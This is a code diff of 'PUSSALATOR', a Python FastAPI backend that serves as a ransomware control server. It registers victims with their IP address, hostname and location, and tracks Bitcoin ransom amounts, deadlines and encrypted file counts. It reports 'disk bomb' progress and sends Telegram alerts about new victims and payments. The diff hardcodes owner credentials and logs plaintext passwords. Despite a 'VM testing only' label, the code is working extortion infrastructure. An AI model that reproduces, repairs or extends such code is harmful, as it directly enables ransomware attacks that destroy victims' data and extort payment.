@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSSALATOR - Complete Backend with Telegram Bot
+PUSSALATOR - Fixed Backend with Proper Authentication
 FOR VM TESTING ONLY
 """
 
@@ -32,16 +32,16 @@ import requests
 # ============================================================================
 
 class Config:
-    SECRET_KEY = os.environ.get('SECRET_KEY',)
+    SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
     
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
-    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS',)
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS', '1PussWalletVMTest')
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
-    # Owner credentials
-    OWNER_ID = os.environ.get('OWNER_ID',)
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD',)
+    # Owner credentials - FIXED: Set default values
+    OWNER_ID = os.environ.get('OWNER_ID', '40671Mps19*')
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD', 'pussalator123')
     
     # Telegram Bot
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
@@ -50,10 +50,10 @@ class Config:
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
     HOST = '0.0.0.0'
-    PORT = int(os.environ.get('PORT', 8000))
+    PORT = int(os.environ.get('PORT', 10000))
     
     # Database
-    DATABASE = 'pussalator3.db'
+    DATABASE = 'pussalator.db'
 
 # ============================================================================
 # DATABASE SETUP
@@ -166,55 +166,86 @@ def db_update(table, data, where, where_params):
     db_execute(query, values)
 
 # ============================================================================
-# TELEGRAM BOT
+# TELEGRAM BOT - FIXED
 # ============================================================================
 
 class TelegramBot:
-    """Telegram bot for notifications"""
+    """Telegram bot for notifications - FIXED error handling"""
     
     def __init__(self):
         self.token = Config.TELEGRAM_BOT_TOKEN
         self.chat_id = Config.TELEGRAM_CHAT_ID
         self.enabled = bool(self.token and self.chat_id)
+        self.last_error_time = 0
+        self.error_count = 0
         
         if self.enabled:
-            print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
+            # Test the bot on startup
+            test_msg = self.send("🔴 PUSSALATOR BACKEND STARTED", silent=True)
+            if test_msg:
+                print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
+            else:
+                print("[-] Telegram bot configured but not working - check token and chat ID")
+                self.enabled = False
         else:
             print("[-] Telegram bot disabled - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
     
-    def send(self, message: str) -> bool:
-        """Send message to Telegram"""
+    def send(self, message: str, silent: bool = False) -> bool:
+        """Send message to Telegram with rate limiting and error handling"""
         if not self.enabled:
             return False
         
+        # Rate limiting - don't send more than 1 message per second
+        current_time = time.time()
+        if current_time - self.last_error_time < 1:
+            time.sleep(1)
+        
         try:
-            # Format message with HTML
-            formatted_msg = f"<b>🔴 PUSSALATOR ALERT</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            # Format message
+            formatted_msg = f"<b>🔴 PUSSALATOR</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             
             response = requests.post(
                 f"https://api.telegram.org/bot{self.token}/sendMessage",
                 json={
                     'chat_id': self.chat_id,
                     'text': formatted_msg,
-                    'parse_mode': 'HTML'
+                    'parse_mode': 'HTML',
+                    'disable_notification': silent
                 },
                 timeout=5
             )
             
             if response.status_code == 200:
-                print(f"[+] Telegram sent: {message[:50]}...")
+                if not silent:
+                    print(f"[+] Telegram sent")
+                self.last_error_time = current_time
                 return True
             else:
-                print(f"[-] Telegram error: {response.status_code}")
+                error_data = response.json()
+                print(f"[-] Telegram error {response.status_code}: {error_data.get('description', 'Unknown')}")
+                
+                # If bot was blocked or chat not found, disable it
+                if response.status_code == 403 or response.status_code == 400:
+                    if self.error_count > 3:
+                        print("[-] Too many Telegram errors - disabling bot")
+                        self.enabled = False
+                    self.error_count += 1
+                
+                self.last_error_time = current_time
                 return False
                 
+        except requests.exceptions.Timeout:
+            print("[-] Telegram timeout")
+            return False
         except Exception as e:
             print(f"[-] Telegram exception: {e}")
             return False
     
     def notify_new_victim(self, victim_id: str, location: str, ip: str, hostname: str):
         """Send notification about new victim"""
-        msg = f"""<b>🔥 NEW VICTIM REGISTERED</b>
+        if not self.enabled:
+            return
+        msg = f"""🔥 <b>NEW VICTIM</b>
 
 <b>ID:</b> <code>{victim_id}</code>
 <b>Hostname:</b> {hostname}
@@ -224,56 +255,42 @@ class TelegramBot:
     
     def notify_payment(self, victim_id: str, amount: str, tx_id: str):
         """Send notification about payment"""
-        msg = f"""<b>💰 PAYMENT RECEIVED</b>
+        if not self.enabled:
+            return
+        msg = f"""💰 <b>PAYMENT RECEIVED</b>
 
 <b>ID:</b> <code>{victim_id}</code>
 <b>Amount:</b> {amount}
-<b>Transaction:</b> <code>{tx_id}</code>
-
-<b>🎉 The demon is pleased!</b>"""
+<b>Transaction:</b> <code>{tx_id}</code>"""
         self.send(msg)
     
     def notify_bomb_start(self, victim_id: str):
         """Send notification about bomb start"""
-        msg = f"""<b>💣 DISK BOMB ACTIVATED</b>
+        if not self.enabled:
+            return
+        msg = f"""💣 <b>DISK BOMB ACTIVATED</b>
 
-<b>ID:</b> <code>{victim_id}</code>
-
-<b>Their hard drive is being consumed by hellfire!</b>"""
+<b>ID:</b> <code>{victim_id}</code>"""
         self.send(msg)
     
     def notify_bomb_progress(self, victim_id: str, size_gb: float):
         """Send notification about bomb progress"""
-        msg = f"""<b>💣 BOMB PROGRESS</b>
+        if not self.enabled:
+            return
+        if int(size_gb) % 10 == 0:  # Only send every 10GB to avoid spam
+            msg = f"""💣 <b>BOMB PROGRESS</b>
 
 <b>ID:</b> <code>{victim_id}</code>
-<b>Size:</b> {size_gb:.2f} GB
-
-<b>The demon grows stronger...</b>"""
-        self.send(msg)
+<b>Size:</b> {size_gb:.2f} GB"""
+            self.send(msg, silent=True)  # Silent to avoid notification spam
     
     def notify_bomb_stop(self, victim_id: str):
         """Send notification about bomb stop"""
-        msg = f"""<b>⛓️ BOMB STOPPED</b>
+        if not self.enabled:
+            return
+        msg = f"""⛓️ <b>BOMB STOPPED</b>
 
-<b>ID:</b> <code>{victim_id}</code>
-
-<b>The demon rests... for now.</b>"""
-        self.send(msg)
-    
-    def notify_status_update(self, victim_id: str, status: str, files: int):
-        """Send notification about status update"""
-        status_emoji = {
-            'paid': '✅',
-            'unpaid': '⏳',
-            'expired': '💀'
-        }.get(status, '❓')
-        
-        msg = f"""<b>{status_emoji} STATUS UPDATE</b>
-
-<b>ID:</b> <code>{victim_id}</code>
-<b>Status:</b> {status.upper()}
-<b>Files Encrypted:</b> {files}"""
+<b>ID:</b> <code>{victim_id}</code>"""
         self.send(msg)
 
 # Initialize Telegram bot
@@ -390,8 +407,9 @@ def check_expired_victims():
                         db_update('victims', {'status': 'expired'}, 'id = ?', [victim['id']])
                         print(f"[+] Victim {victim['id']} expired")
                         
-                        # Send Telegram notification
-                        telegram.notify_status_update(victim['id'], 'expired', victim['files'])
+                        # Send Telegram notification (silent)
+                        if telegram.enabled:
+                            telegram.send(f"⏰ Victim {victim['id']} expired", silent=True)
             
             time.sleep(60)  # Check every minute
             
@@ -411,24 +429,18 @@ expiry_thread.start()
 async def lifespan(app: FastAPI):
     # Startup
     print("=" * 60)
-    print("PUSSALATOR - COMPLETE BACKEND WITH TELEGRAM")
+    print("PUSSALATOR - FIXED BACKEND")
     print("=" * 60)
     print(f"Server: http://{Config.HOST}:{Config.PORT}")
     print(f"Owner ID: {Config.OWNER_ID}")
+    print(f"Owner Password: {'*' * len(Config.OWNER_PASSWORD)}")
     print(f"Telegram: {'✅ ENABLED' if telegram.enabled else '❌ DISABLED'}")
     print("=" * 60)
     print("WARNING: For VM testing only!")
     print("=" * 60)
     
-    # Send startup notification
-    if telegram.enabled:
-        telegram.send("<b>🚀 PUSSALATOR BACKEND STARTED</b>\n\nThe demon awakens...")
-    
     yield
     
-    # Shutdown
-    if telegram.enabled:
-        telegram.send("<b>💤 PUSSALATOR BACKEND SHUTDOWN</b>\n\nThe demon sleeps...")
     print("[+] Shutting down...")
 
 app = FastAPI(
@@ -1505,14 +1517,14 @@ async def api_stats():
 
 @app.get("/api/victim/{victim_id}")
 async def api_get_victim(victim_id: str):
-    """Get victim details (public)"""
+    """Get victim details (public) - FIXED: Correct endpoint path"""
     try:
         victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
         
         if not victim:
             raise HTTPException(status_code=404, detail="Victim not found")
         
-        # Check deadline (already handled by background thread, but double-check)
+        # Check deadline
         if victim['status'] == 'unpaid' and victim.get('deadline'):
             deadline = datetime.fromisoformat(victim['deadline'])
             if datetime.utcnow() > deadline:
@@ -1579,7 +1591,7 @@ async def api_add_victim(victim_data: VictimRegister, background_tasks: Backgrou
         
         print(f"[+] New victim registered: {victim_id}")
         
-        # Send Telegram notification
+        # Send Telegram notification (async)
         location = f"{victim_data.city}, {victim_data.country}" if victim_data.city != 'Unknown' else victim_data.country
         background_tasks.add_task(
             telegram.notify_new_victim,
@@ -1688,7 +1700,7 @@ async def api_bomb_update(bomb_data: BombUpdate, background_tasks: BackgroundTas
                 update_dict['bomb_status'] = 'active'
                 background_tasks.add_task(telegram.notify_bomb_start, bomb_data.client_id)
             
-            # Progress notifications every 10GB
+            # Progress notifications (throttled)
             if int(bomb_data.size_gb) % 10 == 0 and bomb_data.size_gb > 0:
                 background_tasks.add_task(telegram.notify_bomb_progress, bomb_data.client_id, bomb_data.size_gb)
         
@@ -1701,7 +1713,7 @@ async def api_bomb_update(bomb_data: BombUpdate, background_tasks: BackgroundTas
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
-# ROUTES - API (Telegram)
+# ROUTES - API (Telegram) - FIXED
 # ============================================================================
 
 @app.get("/api/telegram/status")
@@ -1718,7 +1730,7 @@ async def api_telegram_test():
     if not telegram.enabled:
         raise HTTPException(status_code=400, detail="Telegram not configured")
     
-    success = telegram.send("<b>🧪 TEST MESSAGE</b>\n\nThe demon is watching...")
+    success = telegram.send("🧪 <b>TEST MESSAGE</b>\n\nThe demon is watching...")
     return {'success': success}
 
 @app.post("/api/telegram/notify")
@@ -1731,20 +1743,25 @@ async def api_telegram_notify(request: Request):
     victim_id = data.get('victim_id')
     message = data.get('message', 'Manual notification')
     
-    success = telegram.send(f"<b>📋 ADMIN NOTIFICATION</b>\n\n<b>Victim:</b> {victim_id}\n<b>Message:</b> {message}")
+    success = telegram.send(f"📋 <b>ADMIN NOTIFICATION</b>\n\n<b>Victim:</b> {victim_id}\n<b>Message:</b> {message}")
     return {'success': success}
 
 # ============================================================================
-# ROUTES - API (Owner Only)
+# ROUTES - API (Owner Only) - FIXED AUTHENTICATION
 # ============================================================================
 
 @app.post("/api/owner/login")
 async def api_owner_login(login_data: OwnerLogin):
-    """Owner login API"""
+    """Owner login API - FIXED: Proper credential checking"""
+    print(f"[+] Login attempt: ID='{login_data.owner_id}', Password='{login_data.password}'")
+    print(f"[+] Expected: ID='{Config.OWNER_ID}', Password='{Config.OWNER_PASSWORD}'")
+    
     if login_data.owner_id == Config.OWNER_ID and login_data.password == Config.OWNER_PASSWORD:
         log_action('owner_login', 'Owner logged in')
+        print("[+] Login successful")
         return {'success': True}
     
+    print("[-] Login failed - invalid credentials")
     raise HTTPException(status_code=401, detail="Invalid credentials")
 
 @app.post("/api/owner/logout")
